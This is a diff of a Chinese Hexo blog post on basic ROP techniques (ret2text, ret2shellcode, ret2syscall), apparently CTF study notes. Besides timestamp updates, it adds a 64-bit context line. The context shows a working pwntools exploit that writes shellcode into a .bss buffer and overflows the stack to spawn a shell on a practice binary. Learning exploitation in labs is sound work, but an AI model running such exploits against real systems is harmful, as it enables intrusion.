@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://i.postimg.cc/RVTr96fh/default.jpg">
 <meta property="article:published_time" content="2024-03-19T12:52:40.000Z">
-<meta property="article:modified_time" content="2024-03-19T12:52:14.843Z">
+<meta property="article:modified_time" content="2024-03-20T01:51:05.079Z">
 <meta property="article:author" content="Jerry k">
 <meta property="article:tag" content="ROP">
 <meta name="twitter:card" content="summary">
@@ -56,7 +56,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-03-19 20:52:14'
+  postUpdate: '2024-03-20 09:51:05'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -153,7 +153,7 @@
         }
       }
       detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.postimg.cc/RVTr96fh/default.jpg" onerror="onerror=null;src='null'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Chen's blog"><span class="site-name">Chen's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基本ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-19T12:52:40.000Z" title="发表于 2024-03-19 20:52:40">2024-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-19T12:52:14.843Z" title="更新于 2024-03-19 20:52:14">2024-03-19</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><em>仅供个人学习参考</em>  </p>
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.postimg.cc/RVTr96fh/default.jpg" onerror="onerror=null;src='null'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Chen's blog"><span class="site-name">Chen's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基本ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-19T12:52:40.000Z" title="发表于 2024-03-19 20:52:40">2024-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-20T01:51:05.079Z" title="更新于 2024-03-20 09:51:05">2024-03-20</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><em>仅供个人学习参考</em>  </p>
 <span id="more"></span>
 
 <h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><em>有后门就是爽</em></p>
@@ -163,6 +163,9 @@
 <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><em>没有system（“&#x2F;bin&#x2F;sh”）就创造一个出来！！</em></p>
 <p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreih2w64dundco6wy4eltsf6eqlhc7dvwoziuiftnwe2wm2aaoss2vy" alt="1"><br>发现有可读可写可执行段<br>打开ida<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiha54ne2p5u7vjd2f6tdnmty5marlcqv4uar3muz4nwlnxxo4a5oq" alt="2"><br>&emsp;&emsp;有栈溢出，并且将s的数据拷贝到buf上，因为栈不可执行，所以我们可以把后门函数写入到buf上（buf位于.bss段），然后再通过栈溢出返回到buf，即可获得shell<br>exp如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">io.sendline(shellcode.ljust((<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>),<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>若文件是64位的，需要加个：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><em>简单的一次代码碎片利用</em><br><em>“震惊！！小小碎片竟然能够……”</em></p>
 <p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihl4i3gaqkwx2z4spiu3lrtpx2btts3k7dhqzh7as5ymswb4krwue" alt="1"><br>开启了nx保护<br>再用ida看看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibbq5j2yegjl7gu4xxy4pcmg73w67ygpffvyd4b4ltg2yk73qh3wq" alt="2"><br>存在栈溢出，且有字符串“&#x2F;bin&#x2F;sh”，但是经过查找发现有可利用的代码片段，于是采用rop的思路，通过系统调用获取shell</p>
